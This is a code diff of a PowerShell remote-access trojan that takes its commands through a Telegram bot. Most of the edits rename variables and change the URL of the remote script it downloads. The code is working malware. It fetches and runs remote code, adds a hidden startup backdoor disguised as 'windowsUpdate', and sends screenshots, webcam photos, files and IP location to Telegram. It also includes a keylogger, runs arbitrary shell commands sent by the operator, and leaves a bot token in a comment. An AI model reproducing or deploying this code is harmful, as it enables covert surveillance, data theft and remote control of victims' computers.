@@ -1,4 +1,3 @@
-
 <#  
 BADUSB COMMANDS:
     # Execute 
@@ -14,9 +13,8 @@ BOT TELEGRAM:
     https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
 	#>
 	########################################################## Agent Bot Code ##########################################################
-
-function create_agent {param ($BotToken,$ChatID)
-$agent_bot = '[string]$BotToken = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/whobornin1980/bot/master/Functions.ps1").content;$ChatID = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$BotToken/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $ChatID -botkey $BotToken; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $BotToken -chat_id $ChatID -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$BotToken" -replace "your_chat_id", "$ChatID" -replace "your_delay", "1" ; return $agent_bot}
+function create_agent {param ($botkey,$chat_id)
+$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
 
 function code_a_base64 {param ($code)
 $ms = New-Object IO.MemoryStream
@@ -42,7 +40,6 @@ return $codeScript
 	
 	
 	
-	
 Function check-command
 {
  Param ($command)
@@ -59,8 +56,8 @@ if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclie
 ## CONFIG ##
 ############
 
-#//$BotToken = '734458093:AAFNojUkBQN1Nbft4fqONRGxctvA0yim7nA'
-#//$ChatID = '611715845'
+#//$botkey = '734458093:AAFNojUkBQN1Nbft4fqONRGxctvA0yim7nA'
+#//$chat_id = '611715845'
 $githubScript = 'https://github.com/whobornin1980/bot/blob/master/Functions.ps1'
 
 
@@ -122,7 +119,7 @@ function backdoor {
         # Check backdoor
         #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($checkBackdoor)"
 		
         # Backdoor on startup programs
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
@@ -187,38 +184,38 @@ function installCurl {
 
 function sendPhoto {
     Send-Message "Sending.."
-    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
+    $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Start-Sleep -Seconds 5
     Send-Message "Deleting.."
     Remove-Item $photo
-    #& $curl -s -X POST "https://api.telegram.org/bot"$BotToken"/sendPhoto" -F chat_id=$ChatID -F photo="@$SnapFile"
+    #& $curl -s -X POST "https://api.telegram.org/bot"$botkey"/sendPhoto" -F chat_id=$chat_id -F photo="@$SnapFile"
 }
 
 function Send-Message($message) {
-    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
+    $uri = "https://api.telegram.org/bot" + $botkey + "/sendMessage"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F text=' + $message  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 }
 
 function ipPublic {
     #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
     $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($ipPublic)&parse_mode=html"
 }
 
 function download($FileToDownload) {
-    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
+    $uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $FileToDownload  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 
-    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
+    #curl -F chat_id="$chat_id" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
 function keylogger($seconds) {
@@ -315,10 +312,10 @@ function webcam {
     Start-Sleep -Seconds 5
 
     Send-Message "Sending_picture.."
-    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
+    $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Start-Sleep -Seconds 5
@@ -636,13 +633,13 @@ if($nopreview) { $preview_mode = "True" }
 if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}
 
 $payload = @{
-    "chat_id" = $ChatID;
+    "chat_id" = $chat_id;
     "text" = $info;
     "parse_mode" = $markdown_mode;
     "disable_web_page_preview" = $preview_mode;
 }
 Invoke-WebRequest `
-    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
+    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $botkey) `
     -Method Post `
     -ContentType "application/json;charset=utf-8" `
     -Body (ConvertTo-Json -Compress -InputObject $payload)
@@ -657,7 +654,7 @@ $LoopSleep = 3
  
  
 #Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
-$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($botkey)/getUpdates"
 $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
 $LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
  
@@ -677,7 +674,7 @@ While ($DoNotExit)  {
   $Message = ""
   
   #Get the current Bot Updates and store them in an array format to make it easier
-  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($botkey)/getUpdates"
   $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
   
   #Get just the last message:
@@ -701,7 +698,7 @@ While ($DoNotExit)  {
 	    #The user wants to run a command
 		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
 		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
-		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($Message)&parse_mode=html"
 		
 		#Run the command
 		Try {
@@ -714,22 +711,22 @@ While ($DoNotExit)  {
 		}
 		
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($Message)&parse_mode=html"
         $pwd = pwd
         $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
-		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
+		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($info)"
 	  }
 	  "/stop $ipV4"  {
 		#The user wants to stop the script
 		write-host "The script will end in 5 seconds"
 		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
-		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
+		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($ExitMessage)&parse_mode=html"
 		Sleep -seconds 5
 		$DoNotExit = 0
 	  }
       "/list"  {
         Invoke-WebRequest `
-        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
+        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $botkey) `
         -Method Post `
         -ContentType "application/json;charset=utf-8" `
         -Body (ConvertTo-Json -Compress -InputObject $payload)
@@ -784,7 +781,7 @@ While ($DoNotExit)  {
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($Message)&parse_mode=html"
 	  }
 	}
 	
